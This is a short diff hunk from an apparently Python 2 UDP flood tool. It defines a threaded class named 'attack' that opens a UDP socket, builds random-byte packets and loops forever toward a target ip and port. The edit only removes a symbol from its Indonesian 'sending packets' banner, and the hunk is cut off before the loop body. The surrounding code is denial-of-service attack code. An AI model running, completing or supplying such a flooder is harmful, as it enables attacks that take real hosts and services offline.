@@ -11,7 +11,7 @@ class attack(threading.Thread):
          self.psize = psize
  
      def run(self):
-         print "\033[1;91m[¢] KIRIMINAN PAKET|\033[1;32mDARI " + self.ip + ":" + str(self.port) + "|UPTOBOY"
+         print "\033[1;91mKIRIMINAN PAKET|\033[1;32mDARI " + self.ip + ":" + str(self.port) + "|UPTOBOY"
          sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
          bytes = random._urandom(self.psize)
          while True:
